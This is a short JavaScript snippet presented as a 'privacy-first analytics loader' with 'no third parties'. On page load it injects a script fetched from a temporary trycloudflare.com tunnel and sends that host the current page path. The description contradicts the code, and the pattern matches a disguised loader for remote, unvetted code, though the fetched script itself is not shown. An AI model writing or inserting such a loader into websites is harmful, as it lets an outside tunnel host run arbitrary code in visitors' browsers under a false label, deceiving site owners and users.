/* BCE privacy-first analytics loader (no cookies, no third parties).
   The collector URL below is updated automatically when the tunnel restarts. */
(function(){
  var COLLECTOR="https://php-kid-lisa-sen.trycloudflare.com";
  var s=document.createElement('script');
  s.src=COLLECTOR+'/tracker.js'; s.defer=true;
  s.setAttribute('data-collector',COLLECTOR);
  s.setAttribute('data-page',location.pathname);
  document.head.appendChild(s);
})();
